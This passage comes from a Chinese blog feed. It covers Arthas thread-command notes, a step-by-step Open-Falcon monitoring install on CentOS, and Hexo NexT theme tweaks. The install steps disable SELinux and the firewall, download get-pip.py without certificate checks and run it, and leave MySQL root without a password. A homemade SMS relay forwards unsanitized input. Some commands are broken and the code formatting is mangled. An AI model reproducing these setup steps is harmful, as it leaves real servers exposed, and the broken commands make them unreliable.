thread查看当前线程信息，查看线程的堆栈 参数说明 参数名称 参数说明 id 线程id [n:] 指定最忙的前N个线程并打印堆栈 [b] 找出当前阻塞其他线程的线程 [i &lt;value&gt;] 指定cpu占比统计的采样间隔，单位为毫秒 cpu占比是如何统计出来的？ 这里的cpu统计的是，一段采样间隔内，当前JVM里各个线程所占用的cpu时间占总cpu时间的百分比。其计算方法为： 首先进行一次采样，获得所有线程的cpu的使用时间(调用的是java.lang.management.ThreadMXBean#getThreadCpuTime这个接口)，然后睡眠一段时间，默认100ms，可以通过-i参数指定，然后再采样一次，最后得出这段时间内各个线程消耗的cpu时间情况，最后算出百分比。 注意： 这个统计也会产生一定的开销（JDK这个接口本身开销比较大），因此会看到as的线程占用一定的百分比，为了降低统计自身的开销带来的影响，可以把采样间隔拉长一些，比如5000毫秒。 如果想看从Java进程启动开始到现在的cpu占比情况：可以使用show-busy-java-threads这个脚本 jvm查看当前JVM信息 这里列举三个命令不再赘述，如你需要深入了解和使用，请详读介绍中的用户文档。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务优化</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式开源监控系统open-falcon安装使用笔记]]></title>
    <url>%2Farticles%2F4354c695.html</url>
    <content type="text"><![CDATA[官方介绍监控系统是整个运维环节，乃至整个产品生命周期中最重要的一环，事前及时预警发现故障，事后提供翔实的数据用于追查定位问题。监控系统作为一个成熟的运维产品，业界有很多开源的实现可供选择。当公司刚刚起步，业务规模较小，运维团队也刚刚建立的初期，选择一款开源的监控系统，是一个省时省力，效率最高的方案。之后，随着业务规模的持续快速增长，监控的对象也越来越多，越来越复杂，监控系统的使用对象也从最初少数的几个SRE，扩大为更多的DEVS，SRE。这时候，监控系统的容量和用户的“使用效率”成了最为突出的问题。 ​ 监控系统业界有很多杰出的开源监控系统。我们在早期，一直在用zabbix，不过随着业务的快速发展，以及互联网公司特有的一些需求，现有的开源的监控系统在性能、扩展性、和用户的使用效率方面，已经无法支撑了。 ​ 因此，我们在过去的一年里，从互联网公司的一些需求出发，从各位SRE、SA、DEVS的使用经验和反馈出发，结合业界的一些大的互联网公司做监控，用监控的一些思考出发，设计开发了小米的监控系统：Open-Falcon。 特点： 数据采集免配置：agent自发现、支持Plugin、主动推送模式 容量水平扩展：生产环境每秒50万次数据收集、告警、存储、绘图，可持续水平扩展。 告警策略自发现：Web界面、支持策略模板、模板继承和覆盖、多种告警方式、支持回调动作。 告警设置人性化：支持最大告警次数、告警级别设置、告警恢复通知、告警暂停、不同时段不同阈值、支持维护周期，支持告警合并。 历史数据高效查询：秒级返回上百个指标一年的历史数据。 Dashboard人性化：多维度的数据展示，用户自定义Dashboard等功能。 架构设计高可用：整个系统无核心单点，易运维，易部署 架构图：官网架构图 其中虚线所在的aggregator组件还在设计开发阶段。 网友画的 监控指标每台服务器，都有安装falcon-agent，falcon-agent是一个golang开发的daemon程序，用于自发现的采集单机的各种数据和指标，这些指标包括不限于以下几个方面，共计200多项指标。 CPU相关 磁盘相关 IO Load 内存相关 网络相关 端口存活、进程存活 ntp offset（插件） 某个进程资源消耗（插件） netstat、ss 等相关统计项采集 机器内核配置参数 只要安装了falcon-agent的机器，就会自动开始采集各项指标，主动上报，不需要用户在server做任何配置（这和zabbix有很大的不同），这样做的好处，就是用户维护方便，覆盖率高。当然这样做也会server端造成较大的压力，不过open-falcon的服务端组件单机性能足够高，同时都可以水平扩展，所以自动多采集足够多的数据，反而是一件好事情，对于SRE和DEV来讲，事后追查问题，不再是难题。 另外，falcon-agent提供了一个proxy-gateway，用户可以方便的通过http接口，push数据到本机的gateway，gateway会帮忙高效率的转发到server端。 falcon-agent，可以在我们的github上找到 : https://github.com/open-falcon/agent 数据流程图： 安装准备系统环境：centos7.6123456789#源更新yum -y update#安装常用系统工具yum -y install wget telnet git net-tools deltarpm epel-release#关闭防火墙sed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/configsetenforce 0systemctl stop firewalldsystemctl disable firewalld 安装一些系统常用软件1yum -y install gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel zip unzip ncurses ncurses-devel curl curl-devel e2fsprogs e2fsprogs-devel krb5-devel libidn libidn-devel openssl openssh openssl-devel libxslt-devel libevent-devel ntp libtool-ltdl bison libtool vim-enhanced python wget lsof iptraf strace lrzsz kernel-devel kernel-headers pam-devel Tcl/Tk cmake ncurses-devel bison setuptool popt-devel net-snmp screen perl-devel pcre-devel net-snmp screen tcpdump rsync sysstat man iptables sudo idconfig git system-config-network-tui bind-utils update arpscan tmux elinks numactl iftop bwm-ng 安装pip1234567891011121314wget https://bootstrap.pypa.io/get-pip.py --no-check-certificatepython get-pip.py#使用国内豆瓣源mkdir /root/.pipvi /root/.pip/pip.conf[global]index-url = [http://pypi.douban.com/simple](http://pypi.douban.com/simple)trusted-host = pypi.douban.com 安装数据库12345wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpmrpm -ivh mysql-community-release-el7-5.noarch.rpmyum install mysql-community-serversystemctl start mysqlsystemctl enable mysqld 安装redis123yum install redissystemctl start redissystemctl enable redis 安装go环境（若使用编译好的二进制文件，此步骤可忽略）123yum install golanggo versiongo version go1.6.3 linux/amd64 初始化数据库12345678910mkdir /opt/openfalconcd /opt/openfalcongit clone https://github.com/open-falcon/scripts.git#导入表结构cd scriptsmysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/graph-db-schema.sqlmysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/dashboard-db-schema.sqlmysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/portal-db-schema.sqlmysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/links-db-schema.sqlmysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/uic-db-schema.sql 下载编译好的组件123456789101112mkdir /opt/openfalcon/tmpcd /opt/openfalcon/tmpwget https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gztar -zxf https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gzrm -rf https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gzcd /opt/openfalconfor x in `find ./tmp/ -name &quot;*.tar.gz&quot;`;do app=`echo $x|cut -d&apos;-&apos; -f2`;mkdir -p $app;tar -zxf $x -C $app; done 开始安装第一部分：绘图组件安装组件列表： 组件名称 用途 服务端口 备注 Agent 部署在目标机器采集机器监控项 http: 1988 Transfer 数据接收端，转发数据到后端Graph和Judge http: 6060 rpc: 8433 socket: 4444 Graph 操作rrd文件存储监控数据 http: 6070 rpc: 6071 1.可部署多实例做集群 2.需要连接数据库graph Query 查询各个Graph数据，提供统一http查询接口 http: 9966 Dashboard 查询监控历史趋势图的web端 http: 8081 1.需要python虚拟环境 2.需要连接数据库dashborad、graph Task 负责一些定时任务，索引全量更新、垃圾索引清理、自身组件监控等 http: 8002 1.需要连接数据库graph 安装Agentagent用于采集机器负载监控指标，比如cpu.idle、load.1min、disk.io.util等等，每隔60秒push给Transfer。agent与Transfer建立了长连接，数据发送速度比较快，agent提供了一个http接口/v1/push用于接收用户手工push的一些数据，然后通过长连接迅速转发给Transfer。 每台机器上，都需要部署agent。修改配置并启动 12345678910111213cd/opt/openfalcon/agent/mv cfg.example.json cfg.jsonvim cfg.json修改 transfer这个配置项的enabled为 true，表示开启向transfer发送数据的功能修改 transfer这个配置项的addr为：[&quot;127.0.0.1:8433&quot;] (改地址为transfer组件的监听地址, 为列表形式，可配置多个transfer实例的地址，用逗号分隔)#默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可#cfg.json中的各配置项，可以参考 https://github.com/open-falcon/agent/blob/master/README.md#启动./control start#查看日志./control tail 安装Transfertransfer默认监听在:8433端口上，agent会通过jsonrpc的方式来push数据上来。 123456789101112cd /opt/openfalcon/transfer/mv cfg.example.json cfg.json# 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可# cfg.json中的各配置项，可以参考 https://github.com/open-falcon/transfer/blob/master/README.md# 如有必要，请酌情修改cfg.json# 启动transfer./control start# 校验服务,这里假定服务开启了6060的http监听端口。检验结果为ok表明服务正常启动。curl -s &quot;http://127.0.0.1:6060/health&quot;#查看日志./control tail 安装Graphgraph组件是存储绘图数据、历史数据的组件。transfer会把接收到的数据，转发给graph。 #创建存储数据目录 mkdir -p /opt/openfalcon/data/6070 1234567891011cd /opt/openfalcon/graph/mv cfg.example.json cfg.json# 默认情况下（所有组件都在同一台服务器上），绘图数据我改为了/opt/openfalcon/data/6070，还有就是数据库密码需要加上# cfg.json中的各配置项，可以参考 https://github.com/open-falcon/graph/blob/master/README.md# 启动./control start# 查看日志./control tail# 校验服务,这里假定服务开启了6071的http监听端口。检验结果为ok表明服务正常启动。curl -s &quot;http://127.0.0.1:6071/health&quot; 安装Queryquery组件，绘图数据的查询接口，query组件收到用户的查询请求后，会从后端的多个graph，查询相应的数据，聚合后，再返回给用户。 123456789cd/opt/openfalcon/query/mv cfg.example.json cfg.json# 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可# cfg.json中的各配置项，可以参考 https://github.com/open-falcon/query/blob/master/README.md# 启动./control start# 查看日志./control tail 安装Dashboarddashboard是面向用户的查询界面，在这里，用户可以看到push到graph中的所有数据，并查看其趋势图。 12345678910111213141516#安装依赖和虚拟环境yum install -y python-virtualenv mysql-develcd /opt/openfalcon/dashboard/virtualenv ./env./env/bin/pip install -r pip_requirements.txt#配置# config的路径为 $WORKSPACE/dashboard/rrd/config.py，里面有数据库相关的配置信息，如有必要，请修改。默认情况下(所有组件都在同一台服务器上)，保持默认配置即可# 数据库表结构初始化，请参考前面的 环境准备 阶段#启动./control start#浏览器访问http://IP:8081#查看日志./control tail 安装Tasktask是监控系统一个必要的辅助模块。定时任务，实现了如下几个功能： index更新。包括图表索引的全量更新 和 垃圾索引清理。 falcon服务组件的自身状态数据采集。定时任务了采集了transfer、graph、task这三个服务的内部状态数据。 falcon自检控任务。 1234567891011cd /opt/openfalcon/task# #修改配置, 配置项含义见下文mv cfg.example.json cfg.json# 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可# cfg.json中的各配置项，可以参考 https://github.com/open-falcon/query/blob/master/README.md# 启动服务./control start# 校验服务,这里假定服务开启了8002的http监听端口。检验结果为ok表明服务正常启动。curl -s &quot;127.0.0.1:8002/health&quot; 第二部分：报警组件安装组件列表： 组件名称 用途 服务端口 备注 Sender 报警发送模块，控制并发度，提供发送的缓冲queue http: 6066 UIC（fe） 用户组管理，单点登录 http: 80 1.需要连接数据库：uic Portal 配置报警策略，管理机器分组的web端 http: 5050 1.需要连接数据库：falcon_portal 2.需要python虚拟环境 HBS HeartBeat Server，心跳服务器 http: 6031rpc: 6030 1.需要连接数据库：falcon_portal Judge 报警判断模块 http: 6081 rpc: 6080 1.可部署多实例 Links 报警合并依赖的web端，存放报警详情 http: 5090 1.需要连接数据库：falcon_links 2.需要python虚拟环境 Alarm 报警事件处理器 http: 9912 mail-provider 报警邮件http api http: 4000 小米提供 sms-provider 报警短信http api http: 4040 自行编写 Nodata 检测监控数据的上报异常 http: 6090 1.需要连接数据库：falcon_portal Aggregator 集群聚合模块——聚合某集群下的所有机器的某个指标的值，提供一种集群视角的监控体验。 报警准备：mail-provider &amp; sms-provider监控系统产生报警事件之后需要发送报警邮件或者报警短信，各个公司可能有自己的邮件服务器，有自己的邮件发送方法；有自己的短信通道，有自己的短信发送方法。falcon为了适配各个公司，在接入方案上做了一个规范，需要各公司提供http的短信和邮件发送接口。 短信发送http接口： 1234method: postparams: - content: 短信内容 - tos: 使用逗号分隔的多个手机号 falcon将这样调用该接口： 12url=您公司提供的http短信接口curl $url-d&quot;content=xxx&amp;tos=18611112222,18611112223&quot; 邮件发送http接口： 12345method: postparams: - content: 邮件内容 - subject: 邮件标题 - tos: 使用逗号分隔的多个邮件地址 falcon将这样调用该接口： 12url=您公司提供的http邮件接口curl -X POST $url-d&quot;content=xxx&amp;tos=ulric.qin@gmail.com,user@example.com&amp;subject=xxx&quot; 安装使用mail-provider这里使用小米提供的mail-provider，我是通过网友编译好的二级制包安装的，也可自行编译。 github地址： https://github.com/open-falcon/mail-provider 1234567891011121314151617181920212223242526272829303132333435363738394041git clone https://github.com/open-falcon/mail-providertar xf mail-provider-master.tar.gz rm -rf mail-provider-master.tar.gz mv mail-provider-master mail-providercd mail-provider/#修改配置文件cfg.conf&#123; &quot;debug&quot;: true, &quot;http&quot;: &#123; &quot;listen&quot;: &quot;0.0.0.0:4000&quot;, &quot;token&quot;: &quot;&quot; &#125;, &quot;smtp&quot;: &#123; &quot;addr&quot;: &quot;smtp.exmail.qq.com:25&quot;, &quot;username&quot;: &quot;xxxx@abc.com&quot;, &quot;password&quot;: &quot;12345&quot;, &quot;from&quot;: &quot;xxxx@abc.com&quot; &#125;&#125;#启动./control start#测试邮件接口是否正常，收到邮件证明API 正常。curl http://127.0.0.1:4000/sender/mail -d &quot;tos=29235373@qq.com&amp;subject=xxxx&amp;content=yyyy&quot; 建立sms-provider这里我自己写了个基于python的http server 作为短信接口http api vim http_sms.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#coding=utf-8‘‘‘Created on ``2016``-``10``-``17@author``: chenguomin qq:``29235373@explain``: 实现GET方法和POST方法请求‘‘‘from` `BaseHTTPServer ``import` `HTTPServer,BaseHTTPRequestHandlerimport` `urllibimport` `urllib2def` `send_message(tos,txt):‘‘‘此函数主要用于调用我公司内部的短信API(get方式)，大伙可自行修改。比如：需要加用户名密码,MD5，token的自行查看短信平台提供商手册，如何调用短信API。下面提供一个url供大家参考。‘‘‘ ``#url = &quot;http://www.sms.com:4000/sendsms?uid=16888&amp;pwd=123456&amp;mobile=%s&amp;msg=%s&quot; % (tos, txt) ``url ``=` `&quot;http://192.168.20.88:8080/SendSms/sendsms?mobile=%s&amp;content=%s&quot;` `%` `(tos, txt) ``req ``=` `urllib2.Request(url) ``res_data ``=` `urllib2.urlopen(req) ``res ``=` `res_data.read() ``print` `resclass` `ServerHTTP(BaseHTTPRequestHandler): ``def` `do_GET(``self``): ``path ``=` `self``.path ``print` `path ``#拆分url(也可根据拆分的url获取Get提交才数据),可以将不同的path和参数加载不同的html页面，或调用不同的方法返回不同的数据，来实现简单的网站或接口 ``query ``=` `urllib.splitquery(path) ``print` `query ``self``.send_response(``200``) ``self``.send_header(``&quot;Content-type&quot;``,``&quot;text/html&quot;``) ``self``.send_header(``&quot;test&quot;``,``&quot;This is test!&quot;``) ``self``.end_headers() ``buf ``=` `‘‘‘‘‘&lt;!DOCTYPE HTML&gt; ``&lt;html&gt; ``&lt;head&gt;&lt;title&gt;Get page&lt;``/``title&gt;&lt;``/``head&gt; ``&lt;body&gt; ``&lt;form action``=``&quot;post_page&quot;` `method``=``&quot;post&quot;``&gt; ``mobile: &lt;``input` `type``=``&quot;text&quot;` `name``=``&quot;tos&quot;` `/``&gt;&lt;br ``/``&gt; ``content: &lt;``input` `type``=``&quot;text&quot;` `name``=``&quot;content&quot;` `/``&gt;&lt;br ``/``&gt; ``&lt;``input` `type``=``&quot;submit&quot;` `value``=``&quot;POST&quot;` `/``&gt; ``&lt;``/``form&gt; ``&lt;``/``body&gt; ``&lt;``/``html&gt;‘‘‘ ``self``.wfile.write(buf) ``def` `do_POST(``self``): ``path ``=` `self``.path ``print` `path ``#获取post提交的数据 ``datas ``=` `self``.rfile.read(``int``(``self``.headers[‘content``-``length‘])) ``datas ``=` `urllib.unquote(datas).decode(``&quot;utf-8&quot;``, ‘ignore‘) ``mobile ``=` `datas.split(‘&amp;‘)[``0``].replace(``&quot;tos=&quot;``,&quot;``&quot;).replace(‘&quot;``‘,‘‘) ``content ``=` `datas.split(‘&amp;‘)[``1``].replace(``&quot;content=&quot;``,&quot;``&quot;).replace(‘&quot;``‘,‘‘) ``mm ``=` `mobile.split(‘,‘) ``for` `i ``in` `mm: ``print` `i ``send_message(i,content) ``self``.send_response(``200``) ``self``.end_headers() ``buf ``=` `‘‘‘‘‘&lt;!DOCTYPE HTML&gt; ``&lt;html&gt; ``&lt;head&gt;&lt;title&gt;Post page&lt;``/``title&gt;&lt;``/``head&gt; ``&lt;body&gt;Tos:``%``s &lt;br ``/``&gt;Content:``%``s&lt;``/``body&gt; ``&lt;``/``html&gt;‘‘‘``%` `(mobile, content) ``self``.wfile.write(buf)def` `start_server(port): ``http_server ``=` `HTTPServer((‘‘, ``int``(port)), ServerHTTP) ``http_server.serve_forever()if` `__name__ ``=``=` `&quot;__main__&quot;``: ``#端口可自定义，不冲突就可以，这里设置为：4040 ``start_server(``4040``) 12345678#运行python http servernohup python http_sms.py &amp;#验证：在浏览器访问，提供了简单的页面测试，只有get，post方法。http://ip:4040/#也可以在命令行使用curl测试curl http://192.168.20.99:4040/ -d &quot;tos=1358888888,1868888888&amp;content=testmsg&quot;#openfalcon的sender是post方式传递数据给http api的，所以我需要获取sender post过来的tos和content参数，再发送到公司内部的sms api。 安装alarmalarm模块是处理报警event的，judge产生的报警event写入redis，alarm从redis读取，这个模块被业务搞得很糟乱，各个公司可以根据自己公司的需求重写 123456cd /opt/openfalcon/alarm/mv cfg.example.json cfg.json# vi cfg.json# 把redis配置成与judge同一个./control start 微信告警版本可到我的github拉取 1git clone https://github.com/chensambb/open-falcon-alarm-by-weixin/ 安装sender调用各个公司提供的mail-provider和sms-provider，按照某个并发度，从redis中读取邮件、短信并发送，alarm生成的报警短信和报警邮件都是直接写入redis即可，sender来发送。 123456789101112131415161718192021222324252627282930313233343536cd /opt/openfalcon/sender/mv cfg.example.json cfg.json# vi cfg.json# redis地址需要和后面的alarm、judge使用同一个# queue维持默认# worker是最多同时有多少个线程玩命得调用短信、邮件发送接口# api要给出sms-provider和mail-provider的接口地址#我们现在调用上面的短信和邮件api&#123; &quot;debug&quot;: true, &quot;http&quot;: &#123; &quot;enabled&quot;: true, &quot;listen&quot;: &quot;0.0.0.0:6066&quot; &#125;, &quot;redis&quot;: &#123; &quot;addr&quot;: &quot;127.0.0.1:6379&quot;, &quot;maxIdle&quot;: 5 &#125;, &quot;queue&quot;: &#123; &quot;sms&quot;: &quot;/sms&quot;, &quot;mail&quot;: &quot;/mail&quot; &#125;, &quot;worker&quot;: &#123; &quot;sms&quot;: 10, &quot;mail&quot;: 50 &#125;, &quot;api&quot;: &#123; &quot;sms&quot;: &quot;http://127.0.0.1:4040/&quot;, &quot;mail&quot;: &quot;http://127.0.0.1:4000/sender/mail&quot; &#125;&#125;#启动./control start 安装fe12345678910cd /opt/openfalcon/femv cfg.example.json cfg.json# 请基于cfg.example.json 酌情修改相关配置项# 启动./control start# 查看日志./control tail# 停止服务./control stop 安装portalportal是用于配置报警策略的地方 12345678910111213141516yum install -y python-virtualenv # run as rootcd/opt/openfalcon/portal/virtualenv ./env./env/bin/pip install -r pip_requirements.txt# vi frame/config.py# 1. 修改DB配置# 2. SECRET_KEY设置为一个随机字符串# 3. UIC_ADDRESS有两个，internal配置为FE模块的内网地址，portal通常是和UIC在一个网段的,内网地址相互访问速度快。external是终端用户通过浏览器访问的UIC地址，很重要！# 4. 其他配置可以使用默认的#启动./control start#验证portal默认监听在5050端口，浏览器访问即可 安装HBS(heartbeat Server)心跳服务器，只依赖Portal的DB 12345678cd /opt/openfalcon/hbs/mv cfg.example.json cfg.json# vi cfg.json #把数据库配置配置为portal的db#启动./control start 如果先安装的绘图组件又来安装报警组件，那应该已经安装过agent了，hbs启动之后会监听一个http端口，一个rpc端口，agent要和hbs通信，重新去修改agent的配置cfg.json，把heartbeat那项enabled设置为true，并配置上hbs的rpc地址，./control restart重启agent，之后agent就可以和hbs心跳了 安装judge报警判断模块，judge依赖于HBS，所以得先搭建HBS 1234567891011cd /opt/openfalcon/judge/mv cfg.example.json cfg.json# vi cfg.json# remain: 这个配置指定了judge内存中针对某个数据存多少个点，比如host01这个机器的cpu.idle的值在内存中最多存多少个，# 配置报警的时候比如all(#3)，这个#后面的数字不能超过remain-1# hbs: 配置为hbs的地址，interval默认是60s，表示每隔60s从hbs拉取一次策略# alarm: 报警event写入alarm中配置的redis# minInterval表示连续两个报警之间至少相隔的秒数，维持默认即可#启动./control start 安装LinksLinks是为报警合并功能写的组件。如果你不想使用报警合并功能，这个组件是无需安装的。 Links个Python的项目，无需像Go的项目那样去做编译。不过Go的项目是静态编译的，编译好了之后二进制无依赖，拿到其他机器也可以跑起来，Python的项目就需要安装一些依赖库了。 12345678910# 我们使用virtualenv来管理Python环境，yum安装需切到root账号# yum install -y python-virtualenvcd /opt/openfalcon/links/virtualenv ./env./env/bin/pip install -r pip_requirements.txt#安装完依赖的lib之后就可以用control脚本启动了，log在var目录。不过启动之前要先把配置文件修改成相应配置。另外，监听的端口在gunicorn.conf中配置。#启动./control start 安装Nodatanodata用于检测监控数据的上报异常。nodata和实时报警judge模块协同工作，过程为: 配置了nodata的采集项超时未上报数据，nodata生成一条默认的模拟数据；用户配置相应的报警策略，收到mock数据就产生报警。采集项上报异常检测，作为judge模块的一个必要补充，能够使judge的实时报警功能更加可靠、完善。 12345678910cd /opt/openfalcon/nodatamv cfg.example.json cfg.jsonvim cfg.json# 启动服务./control start# 校验服务,这里假定服务开启了6090的http监听端口。检验结果为ok表明服务正常启动。curl -s &quot;127.0.0.1:6090/health&quot;# 停止服务./control stop 安装Aggregator集群聚合模块。聚合某集群下的所有机器的某个指标的值，提供一种集群视角的监控体验。 123456789101112cd /opt/openfalcon/aggregator# 修改配置, 配置项含义见下文mv cfg.example.json cfg.jsonvim cfg.json# 启动服务./control start# 校验服务，看端口是否在监听ss -tln# 检查log./control tail# 停止服务./control stop 使用方法参考官方book 查看监控数据我们说agent只要部署到机器上，并且配置好了heartbeat和transfer就自动采集数据了，我们就可以去dashboard上面搜索监控数据查看了。dashboard是个web项目，浏览器访问之。左侧输入endpoint搜索，endpoint是什么？应该用什么搜索？对于agent采集的数据，endpoint都是机器名，去目标机器上执行hostname，看到的输出就是endpoint，拿着hostname去搜索。 搜索到了吧？嗯，选中前面的复选框，点击“查看counter列表”，可以列出隶属于这个endpoint的counter，counter是什么？counter=${metric}/sorted(${tags}) 假如我们要查看cpu.idle，在counter搜索框中输入cpu并回车。看到cpu.idle了吧，点击，会看到一个新页面，图表中就是这个机器的cpu.idle的近一小时数据了，想看更长时间的？右上角有个小三角，展开菜单，可以选择更长的时间跨度 配置报警策略上节我们已经了解到如何查看监控数据了，如果数据达到阈值，比如cpu.idle太小的时候，我们应该如何配置告警呢？ falcon的报警接收人不是一个具体的手机号，也不是一个具体的邮箱，因为手机号、邮箱都是容易发生变化的，如果变化了去修改所有相关配置那就太麻烦了。我们把用户的联系信息维护在一个叫UIC(新用户推荐使用Go版本的UIC，即：falcon-fe项目)的系统里，以后如果要修改手机号、邮箱，只要在UIC中修改一次即可。报警接收人也不是单个的人，而是一个组（UIC中称为Team），比如falcon这个系统的任何组件出问题了，都应该发报警给falcon的运维和开发人员，发给falcon这个团队，这样一来，新员工入职只要加入falcon这个Team即可；员工离职，只要从falcon这个Team删掉即可。 浏览器访问UIC，如果启用了LDAP，那就用LDAP账号登陆，如果没有启用，那就注册一个或者找管理员帮忙开通。创建一个Team，名称姑且叫falcon，把自己加进去，待会用来做测试。 创建HostGroup比如我们要对falcon-judge这个组件做端口监控，那首先创建一个HostGroup，把所有部署了falcon-judge这个模块的机器都塞进去，以后要扩容或下线机器的时候直接从这个HostGroup增删机器即可，报警策略会自动生效、失效。咱们为这个HostGroup取名为：sa.dev.falcon.judge，这个名称有讲究，sa是我们部门，dev是我们组，falcon是项目名，judge是组件名，传达出了很多信息，这样命名比较容易管理，推荐大家这么做。 在往组里加机器的时候如果报错，需要检查portal的数据库中host表，看里边是否有相关机器。那host表中的机器从哪里来呢？agent有个heartbeat(hbs)的配置，agent每分钟会发心跳给hbs，把自己的ip、hostname、agent version等信息告诉hbs，hbs负责写入host表。如果host表中没数据，需要检查这条链路是否通畅。 创建策略模板portal最上面有个Templates链接，这就是策略模板管理的入口。我们进去之后创建一个模板，名称姑且也叫：sa.dev.falcon.judge，与HostGroup名称相同，在里边配置一个端口监控，通常进程监控有两种手段，一个是进程本身是否存活，一个是端口是否在监听，此处我们使用端口监控。 右上角那个加号按钮是用于增加策略的，一个模板中可以有多个策略，此处我们只添加了一个。下面可以配置报警接收人，此处填写的是falcon，这是之前在UIC中创建的Team。 将HostGroup与模板绑定一个模板是可以绑定到多个HostGroup的，现在我们重新回到HostGroups页面，找到sa.dev.falcon.judge这个HostGroup，右侧有几个超链接，点击【templates】进入一个新页面，输入模板名称，绑定一下就行了。 补充上面步骤做完了，也就配置完了。如果judge组件宕机，端口不再监听了，就会报警。不过大家不要为了测试报警效果，直接把judge组件给干掉了，因为judge本身就是负责判断报警的，把它干掉了，那就没法判断了……所以说falcon现在并不完善，没法用来监控本身的组件。为了测试，大家可以修改一下端口监控的策略配置，改成一个没有在监听的端口，这样就触发报警了。 上面的策略只是对falcon-judge做了端口监控，那如果我们要对falcon这个项目的所有机器加一些负载监控，应该如何做呢？ 创建一个HostGroup：sa.dev.falcon，把所有falcon的机器都塞进去 创建一个模板：sa.dev.falcon.common，添加一些像cpu.idle,load.1min等策略 将sa.dev.falcon.common绑定到sa.dev.falcon这个HostGroup 附：sa.dev.falcon.common的配置样例 大家可能不知道各个指标分别叫什么，自己push的数据肯定知道自己的metric了，agent push的数据可以参考：https://github.com/open-falcon/agent/tree/master/funcs 如何配置策略表达式策略表达式，即expression，具体可以参考HostGroup与Tags设计理念，这里只是举个例子： 上例中的配置传达出的意思是：falcon-judge这个模块的所有实例，如果qps连续3次大于1000，就报警给falcon这个报警组。 expression无需绑定到HostGroup。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Open-falcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo最新next主题个性化炫酷教程]]></title>
    <url>%2Farticles%2F1071f0bc.html</url>
    <content type="text"><![CDATA[目的看到有些next主题的网站很炫酷，那么是怎么配置的呢？接下来我会讲一讲如何配置next6.x或7.x最新版本实现一些炫酷的效果。先看下我博客网站的效果吧：wandouduoduo.github.io 参考Hexo官网 Theme选择 NexT主题 在右上角或者左上角实现fork me on github效果图如下图所示： 具体实现方法在GitHub Ribbons或GitHub Corners选择一款你喜欢的挂饰，拷贝方框内的代码 将刚刚复制的挂饰代码，添加到Blog/themes/next/layout/_layout.swig文件中，添加位置如下图所示(放在&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下方)： 添加RSS实现效果图 具体实现方法切换到Blog文件夹（hexo init的文件夹）下,并安装插件 12cd [Blog]npm install --save hexo-generator-feed 安装成功之后，编辑Blog/_config.yml文件，在文件末尾添加 123# Extensions## Plugins: http://hexo.io/plugins/plugins: hexo-generate-feed 配置主题_config.yml文件，command+f搜索rss，在后面加上/atom.xml 1234# Set rss to false to disable feed link.# Leave rss as empty to use site&apos;s feed link.# Set rss to specific value if you have burned your feed already.rss: /atom.xml //注意：有一个空格 添加动态背景实现效果图 具体实现方法主题配置文件中找到canvas_nest，设置成ture就OK啦。 12# Canvas-nestcanvas_nest: ture 修改文章内链接文本样式实现效果图 具体实现方法修改文件 themes\next\source\css\_common\components\post\post.styl，在末尾添加如下css样式，： 1234567891011// 文章内链接文本样式.post-body p a&#123; color: #0593d3; //原始链接颜色 border-bottom: none; border-bottom: 1px solid #0593d3; //底部分割线颜色 &amp;:hover &#123; color: #fc6423; //鼠标经过颜色 border-bottom: none; border-bottom: 1px solid #fc6423; //底部分割线颜色 &#125;&#125; 其中选择.post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。 修改底部标签样式实现效果图 具体实现方法修改Blog\themes\next\layout\_macro\post.swig中文件，command+f搜索rel=&quot;tag&quot;&gt;#，将#替换成&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;。输入以下命令，查看效果： 12hexo cleanhexo s 在文章末尾添加“文章结束”标记实现效果图 具体实现方法在路径Blog\themes\next\layout\_macro文件夹中新建passage-end-tag.swig文件,并填写内容如下： 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 打开Blog\themes\next\layout\_macro\post.swig，在post-body之后，post-footer之前（post-footer之前两个DIV），添加以下代码： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 添加位置，如下图所示： 然后打开主题配置文件_config.yml,在末尾添加： 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 修改作者头像并旋转：实现效果图： 具体实现方法在Blog/_config.yml中添加头像链接地址 12//添加头像地址avatar: [ http://....] 打开\themes\next\source\css\_common\components\sidebar\sidebar-author.styl，在里面添加如下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 